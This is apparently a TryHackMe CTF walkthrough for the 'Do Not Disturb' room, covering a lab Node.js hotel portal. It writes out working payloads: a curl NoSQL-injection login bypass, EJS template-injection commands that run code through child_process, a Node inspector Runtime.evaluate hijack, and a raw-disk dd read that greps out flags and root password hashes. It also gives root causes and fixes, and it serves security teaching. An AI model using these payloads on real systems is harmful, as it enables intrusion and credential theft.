# Do Not Disturb — TryHackMe CTF Walkthrough

**Room:** [Do Not Disturb on TryHackMe](https://tryhackme.com/room/donotdisturb)
**Difficulty:** Medium
**Category:** Web / NoSQL Injection + SSTI + Node Inspector + Disk Group Privesc
**Date:** 2026-08-07
**Author:** San007 & Raven

---

## Overview

"Byte Lotus" — the poolside portal of the HackerHolidays hotel universe — lets staff reserve cabanas and customise booking-confirmation emails. The room is a layered chain of four distinct vulnerabilities: a NoSQL injection in the login, a Server-Side Template Injection (SSTI) in an EJS template preview, an exposed Node.js inspector on a secondary service, and a privilege escalation through the `disk` group. Each layer hands you the next user: anonymous → staff → `poolside` → `pipelinesvc` → root.

The theme — "the pool remembers your usual" and "Stay Noticed" — is a pun on session hijacking, which foreshadows both the SSTI and the Node inspector pivots.

---

## What is This Attack Chain?

Four techniques, each building on the last:

**NoSQL Injection** — MongoDB-style databases accept operator objects like `{"$ne": null}` in queries. If an app passes user input straight into a query, an attacker can inject operators that match documents without knowing the password.

**Server-Side Template Injection (SSTI)** — when user input is rendered through a template engine (EJS, Jinja2, Twig), template syntax like `<%= code %>` is evaluated server-side. If the engine has access to Node globals, this becomes arbitrary code execution.

**Node.js Inspector Exposure** — running Node with `--inspect=127.0.0.1:9229` opens the Chrome DevTools Protocol debugger. Anyone who can reach that port can execute arbitrary JavaScript in the process — including spawning shells as that user.

**Disk Group Privilege Escalation** — on Linux, the `disk` group can read raw block devices (`/dev/nvme0n1p1`). Reading the raw filesystem bypasses all file permissions, exposing `/etc/shadow` and root-only files.

**Key concept:** every layer of this box is "untrusted input reaches a privileged engine" — the database query, the template renderer, the debugger, and the filesystem.

**Real-world examples:**
- NoSQL injection in MongoDB-backed login forms (common with Express + Mongo)
- SSTI in report/template features (EJS, Jinja2) leading to RCE
- Node inspector left enabled in production (happens with `nodemon --inspect` or debug builds)
- `disk` group access enabling raw disk reads of /etc/shadow

---

## Reconnaissance

#### Port Scan

```bash
nmap -Pn -T4 --top-ports 100 --open 10.48.181.190
```

```
PORT   STATE SERVICE
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18
80/tcp open  http    Node.js (Express middleware)
```

Two services: SSH and a Node.js/Express web app. The Express fingerprint (X-Powered-By) confirms the stack before we even load the page.

#### Web Enumeration

The homepage is a login portal — "Byte Lotus" poolside reservation system. Route probing found:

```
/logout -> 302 (session handling exists)
everything else -> 404
```

Only POST /login and the staff area are live. The app has session handling (the /logout redirect) which becomes relevant later.

---

## Exploitation

#### Step 1 — NoSQL Injection to Bypass Login

Standard credential attempts (`attendant/attendant`, `admin/admin`) return 401. The app accepts JSON bodies, which is the NoSQL tell. Send MongoDB operator objects:

```bash
curl -s -c /tmp/dnd_cookies.txt -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}' http://10.48.181.190/login
```

```
{"ok":true,"role":"staff"}
```

The `$ne: null` (not-equal) operators match ANY document where those fields exist — the login is bypassed and we're authenticated as `staff`. The session cookie (`connect.sid`) is issued.

#### Step 2 — EJS Template Injection (SSTI) → RCE

The staff console has a "Confirmation template" form that renders an EJS template preview server-side:

```
Confirmation template (EJS — use <%= guest %> to personalise)
```

Test with a math expression:

```bash
curl -s -b /tmp/dnd_cookies.txt --data-urlencode \
  'template=<%= 7*7 %>' http://10.48.181.190/staff/preview
```

The preview renders `49` — EJS evaluates our template. Since `<%= %>` runs in Node's global scope, `process` is accessible. Full RCE via `spawnSync`:

```bash
curl -s -b /tmp/dnd_cookies.txt --data-urlencode \
  'template=<%= (function(){var r=process.mainModule.require("child_process").spawnSync("id",[]);return r.stdout.toString()})() %>' \
  http://10.48.181.190/staff/preview
```

```
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

We're `poolside` (uid 996). The `user.txt` flag is in /home/poolside:

```
THM{<REDACTED>}
```

#### Step 3 — Service Enumeration: The Node Inspector

Checking running services reveals a second custom unit:

```
/etc/systemd/system/lotus-telemetry.service:
User=pipelinesvc
WorkingDirectory=/opt/pipelinesvc/telemetry
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
Restart=always
```

The telemetry processor runs as `pipelinesvc` **with the Node inspector bound to localhost:9229**. Confirmed listening via /proc/net/tcp (port `0x240D` = 9229). The inspector is the intended pivot: connect via the Chrome DevTools Protocol and evaluate JS in that process.

#### Step 4 — Node Inspector Hijack → pipelinesvc

Write a WebSocket client that connects to the inspector, sends a `Runtime.evaluate` CDP command, and returns the result:

```bash
# Get the WS URL
curl -s http://127.0.0.1:9229/json
# → ws://127.0.0.1:9229/4084839e-...
```

The exploit connects to that WebSocket (masked frames, text opcode), sends `Runtime.evaluate` with `spawnSync` as the expression, and prints the value. Run as `poolside` via the SSTI channel, it executes as `pipelinesvc`:

```
RESULT: "uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)"
```

Two findings: we're `pipelinesvc` (uid 995), and pipelinesvc is a member of the **disk** group (gid 6).

#### Step 5 — Disk Group → Root Flag

The `disk` group can read raw block devices. Identify the root partition:

```
lsblk
nvme0n1p1   part  20G  /
```

The root filesystem is `/dev/nvme0n1p1`. Read it raw and grep for the flag pattern — no file permissions apply to raw device reads:

```bash
dd if=/dev/nvme0n1p1 bs=1M count=1024 2>/dev/null | grep -aoE 'THM\{[^}]+\}|root:\$[^:]+' | head -5
```

```
THM{<REDACTED>}    (user flag — previously captured)
THM{<REDACTED>}    (root flag — extracted from raw disk)
```

The second flag is the root flag — the box itself confirming the intended path: *raw disk access was too much*.

---

## Root Cause Analysis

The chain exists because of four distinct root causes:

1. **NoSQL injection — unvalidated query input:**
   `db.findOneAsync({ username, password })` passes raw request body values into the query. Operator objects (`$ne`) are interpreted as query logic.
   *Fix:* validate/sanitise inputs, reject operator keys, use parameterised queries with strict type checks.

2. **SSTI — untrusted input into a template engine:**
   `ejs.render(template, {...})` renders user-supplied text as EJS. Template syntax becomes code in Node's global scope.
   *Fix:* never render user input through template engines; treat templates as code, use a safe string-formatting library or strict allowlist.

3. **Node inspector exposed:**
   `--inspect=127.0.0.1:9229` enables remote code execution for anyone with local access — and the SSTI gave us local access. Inspectors must never run in production, even bound to localhost, when other apps share the host.
   *Fix:* remove `--inspect` from production services; if debugging is needed, use a Unix socket with strict perms or an SSH tunnel.

4. **Disk group membership:**
   `pipelinesvc` in the `disk` group grants raw block-device access — effectively root without credentials. The service account needed the group for no defensible reason.
   *Fix:* remove `disk` from service accounts; the group exists for admins doing filesystem maintenance, not service runtime.

---

## Key Takeaways

| Lesson | Why It Matters |
|--------|---------------|
| **NoSQLi is the modern SQLi** | Operator injection (`$ne`) bypasses auth on MongoDB-style backends — always test JSON login endpoints with operator payloads |
| **Template engines are code engines** | SSTI turns a "preview" feature into RCE; when you see EJS/Jinja/Twig rendering user input, test `<%= 7*7 %>` immediately |
| **--inspect is a backdoor** | Node debuggers bound to localhost are reachable from any local foothold — enumerate listening ports and check for 9229 |
| **The disk group is root-adjacent** | Raw device reads bypass ALL file permissions; always check service account group memberships |
| **The flag name confirms the path** | Room authors literally tell you the intended technique in the flag — here, the root flag named the raw-disk technique |

---

## Tools Used

- **nmap** — port and service enumeration
- **curl** — NoSQL injection, SSTI payloads, inspector HTTP API
- **Node.js (spawnSync)** — RCE primitives through the template
- **Custom WebSocket CDP client** — Runtime.evaluate against the Node inspector
- **dd + grep** — raw block-device reads for the root flag

---

## Flag

```
User flag: THM{<REDACTED>}
Root flag: THM{<REDACTED>}
```

---

## References

- [TryHackMe — Do Not Disturb](https://tryhackme.com/room/donotdisturb)
- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [PayloadsAllTheThings — SSTI (EJS)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [Node.js — Inspector / Debugging Guide](https://nodejs.org/en/docs/guides/debugging-getting-started/)
- [GTFOBins — Disk Group](https://gtfobins.github.io/)
